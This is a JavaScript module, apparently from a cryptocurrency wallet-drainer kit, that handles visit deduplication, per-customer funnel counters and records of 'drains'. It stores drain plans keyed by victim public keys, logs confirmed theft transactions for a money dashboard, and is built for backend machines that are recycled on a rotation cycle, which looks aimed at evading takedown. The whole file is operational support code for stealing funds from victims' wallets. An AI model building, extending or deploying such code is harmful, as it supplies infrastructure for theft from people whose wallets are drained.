/**
 * stats.js — visit dedupe, funnel counters, drain records
 *
 * Three jobs:
 *
 * 1. Visit dedupe — the page re-fires /notify-visit on reload/reconnect
 *    (and *.vercel.app subdomains get crawled constantly — they appear in
 *    certificate transparency logs within minutes of deploy). Same chat+IP
 *    inside 10 minutes counts as one visit and notifies once.
 *
 * 2. Funnel counters per customer chat: visits, rejects, drains.
 *
 * 3. Drain events (txid, amounts) for the money dashboard. Amounts are
 *    computed at build time (stashDrainPlan) and read at relay time, when
 *    the drain becomes real.
 *
 * The backend machine is recycled every rotation cycle, so all of this is
 * ephemeral by design: chimera pulls (GET /admin/stats — pull-and-clear)
 * right BEFORE recycling, and accumulates into its persistent stats file.
 */

const VISIT_DEDUPE_MS = 10 * 60 * 1000;

// "chatId|ip" → last-notified ts
const lastVisitBy = new Map();
// chatId → { visits, rejects, drains }
const counters = new Map();
// drain events pending pickup
const drainEvents = [];
// victim pubkey → drain plan (set at build, consumed at relay)
const pendingDrains = new Map();

function bump(chatId, field) {
  if (chatId == null || String(chatId) === "") return;
  const key = String(chatId);
  const c = counters.get(key) || { visits: 0, rejects: 0, drains: 0 };
  c[field] += 1;
  counters.set(key, c);
}

/** True the first time a chat+IP pair is seen in the dedupe window. */
export function shouldNotifyVisit(chatId, ip) {
  if (!ip) return true; // no IP reported (client geo fetch failed) — notify
  const key = `${chatId}|${ip}`;
  const now = Date.now();
  const last = lastVisitBy.get(key) || 0;
  if (now - last < VISIT_DEDUPE_MS) return false;
  lastVisitBy.set(key, now);
  return true;
}

export function recordVisit(chatId) {
  bump(chatId, "visits");
}

export function recordReject(chatId) {
  bump(chatId, "rejects");
}

/** Save the drain amounts computed at build time, keyed by victim pubkey. */
export function stashDrainPlan(victim, plan) {
  pendingDrains.set(String(victim), plan);
}

/** Take (and remove) the stashed plan for a victim. Null if none. */
export function popDrainPlan(victim) {
  const plan = pendingDrains.get(String(victim));
  pendingDrains.delete(String(victim));
  return plan || null;
}

/** Record a confirmed drain. Called on the first successful relay of a batch. */
export function recordDrain(event) {
  bump(event.chatId, "drains");
  drainEvents.push({ ts: new Date().toISOString(), ...event });
}

/** Pull-and-clear — chimera calls this before recycling the machine.
 * Both counters and events reset, or the next pull would double-count. */
export function pullStats() {
  const out = {
    counters: Object.fromEntries(counters),
    drains: drainEvents.splice(0),
  };
  counters.clear();
  return out;
}
